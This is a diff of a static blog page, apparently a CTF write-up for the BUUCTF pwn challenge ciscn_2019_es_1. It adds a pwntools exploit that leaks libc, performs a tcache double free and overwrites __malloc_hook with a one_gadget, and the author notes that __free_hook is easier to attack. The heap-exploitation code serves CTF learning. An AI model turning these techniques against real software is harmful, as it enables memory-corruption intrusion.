@@ -83,7 +83,7 @@
                         <input id="switch_default" type="checkbox" class="switch_default">
                         <label for="switch_default" class="toggleBtn"></label>
             </div>
-            <form id="gridea-search-form" data-update="1598712208416" action="/search/index.html">
+            <form id="gridea-search-form" data-update="1598751427072" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
             </form>
         </div>
@@ -102,7 +102,7 @@
                         <!--zh-->
                         <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                     </div>
-                    <form id="gridea-search-form" data-update="1598712208416" action="/search/index.html">
+                    <form id="gridea-search-form" data-update="1598751427072" action="/search/index.html">
                         <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                     </form>
                     <!--en-->
@@ -178,9 +178,9 @@
                                 Date: <a href="#">2020-08-25</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">5.8
+                                    href="#">6.3
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1235</a></span>
+                                    <span class="post-words">words:<a href="#">1333</a></span>
                                     
                                             Views:
                                             <span data-hk-page="current"> - </span>
@@ -311,18 +311,20 @@ p.interactive()
 <h2 id="ciscn_2019_es_1">ciscn_2019_es_1</h2>
 <p>今天太忙了，刚搬了宿舍，换了新环境，忙里偷闲打了一道去年的国赛题<br>
 目前就找到两种思路，第一种思路打fastbin的时候有些问题，因为不太清楚python怎么传空字符串之类的问题，导致结构体里面的指针一直在变，所以这种思路等过两天有空的时候再想想吧。第二种思路就是打__free_hook，__free_hook(ready to free) === system(&quot;/bin/sh\x00&quot;)<br>
-思路不写了，注释里都有<br>
+几个点：<br>
+当题目对于申请的chunk大小限制无要求，我们可以申请大chunk，free后放入unsorted bin直接泄漏libc<br>
+攻击__free_hook比one_gadget更简单<br>
 exp:</p>
 <pre><code class="language-python">from pwn import *
 from LibcSearcher import *
 
 #context.log_level = 'debug'
-local = 0
+local = 1
 
 if local == 1:
 	p = process('./ciscn_2019_es_1')
 else:
-	p = remote('node3.buuoj.cn',26804)
+	p = remote('node3.buuoj.cn',25338)
 
 def add(size,name,num):
 	p.sendlineafter('choice:','1')
@@ -337,22 +339,33 @@ def show(index):
 def delete(index):
 	p.sendlineafter('choice:','3')
 	p.sendlineafter('Please input the index:',str(index))
+
 '''
-
 print(&quot;第一种思路：利用fastbin attack 攻击__malloc_hook函数，尚未成功&quot;)
+print(&quot;========== step 1 : leak libc ============&quot;)
+add(0x410,'a','b')	#0
+add(0x10,'c','d')	#1
+delete(0)
+show(0)
+p.recvuntil('name:\n')
+__malloc_hook = u64(p.recv(6) + b'\x00\x00') - 96 - 0x10
+libc = LibcSearcher('__malloc_hook',__malloc_hook)
+libc_base = __malloc_hook - libc.dump(&quot;__malloc_hook&quot;)
+print(&quot;libc base : &quot; + hex(libc_base))
 
-#add(0x50,b'A' * 8,b'BBBB')	#0
-#add(16,b'C' * 16,'DDDDDDDD')
+print(&quot;=========== step 2 : fastbin attack =========&quot;)
+add(0x60,'A','B')	#3
+delete(3)
+delete(3)
+add(0x60,p64(__malloc_hook-0x23),'hack')
 
-#delete(0)
-#delete(0)
-
-#add(0x50,'','')	#1
-
-#show(1)
-#p.recvuntil('name:\n')
-#tcache_perthread_struct = u64(p.recv(6) + '\x00\x00' - 0x280)
-#print('tcache:' + hex(tcache_perthread_struct))
+print(&quot;=========== step 3 : one_gadget =========&quot;)
+one_gadget_list = [0x4f2c5,0x4f322,0x10a38c]
+one_gadget = libc_base + one_gadget_list[1]
+add(0x60,0x13 * b'A' + p64(one_gadget),'hhhh')
+#add(0x10,'a','b')
+pause()
+p.interactive()
 '''
 print(&quot;第二种思路：利用unsorted bin逃逸出tcache bin，然后攻击__free_hook&quot;)
 print(&quot;====================== step1 : leak libc =================&quot;)
@@ -428,8 +441,8 @@ p.interactive()
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
                                                         <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/buu-pwn1/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=qzone&title=buu-pwn(1)&pics=https://l3mon629.github.io/images/avatar.png?v=1598712208416&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=weibo&title=buu-pwn(1) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1598712208416 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=qzone&title=buu-pwn(1)&pics=https://l3mon629.github.io/images/avatar.png?v=1598751427072&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=weibo&title=buu-pwn(1) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1598751427072 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -519,7 +532,7 @@ p.interactive()
                     CheckVersion();
                     
                     var newDate = new Date();
-                    newDate.setTime(1598712208416);
+                    newDate.setTime(1598751427072);
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
